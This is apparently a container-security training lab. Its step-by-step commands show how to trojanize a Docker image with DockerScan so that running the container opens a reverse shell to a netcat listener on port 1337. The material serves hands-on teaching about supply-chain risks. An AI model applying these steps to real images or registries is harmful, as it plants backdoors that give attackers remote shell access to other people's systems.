# Trojanized Docker Images - DockerScan

> A docker image can be trojanized with a tool called `DockerScan`. When a trojanized container is launched, the attacker can get a `reverse-shell` on-to the container

### **Lab Image : Containers**

---

* Step 1: Navigate to the `Trojanized Docker Images` directory

```commandline
cd /root/container-training/Container/Trojanized-Docker-Image/
```

* Step 2: Pull and save the docker image that is to be trojanized

```commandline
docker pull abhaybhargav/vul_flask && docker save abhaybhargav/vul_flask:latest -o abhaybhargav-vul_flask
```

* Step 3: Multiplex terminal session with `tmux` and split panes.

```commandline
tmux
```

```commandline
tmux split-window -h
```

* Step 4: Trojanize the saved docker to create a `.tar` file

>> Note: `$(serverip)` will automatically takes your server ip. 

```commandline
dockerscan image modify trojanize abhaybhargav-vul_flask -l $(serverip) -p 1337 -o abhaybhargav-vul_flask-trojanized
```

* Step 5: Run `netcat` command 

>> Note: `$(serverip)` will automatically takes your server ip.

```commandline
nc -v -k -l $(serverip) 1337
```

* Step 6: Switch to the left panel using `ctrl + b` and then `left arrow key` 

* Step 7: Load the trojanized `.tar` docker file

```commandline
docker load -i abhaybhargav-vul_flask-trojanized.tar
```

Step 8: When the trojanized docker is run, the listener should have reverse-shell access to the container

```commandline
docker run -d -p 5000:5000 abhaybhargav/vul_flask
```

* Step 9: Switch to the right panel using `ctrl + b` and then `right arrow key`

* Step 10: Type `ls` command and weather you have achieved persistence through the reverse shell.

```commandline
ls
```

## Teardown

* Step 11: Exit from the `reverse shell` type `ctrl + c`

```commandline
ctrl + c
```

* Step 12: Exit from the `tmux` shell

```commandline
exit
```

```commandline
exit
```

* Step 13: Stop all containers

```commandline
clean-docker
```

* Step 14: Remove Trojanized container
```commandline
docker rmi abhaybhargav/vul_flask
```

---

### Reading Material/References:

* https://github.com/cr0hn/dockerscan
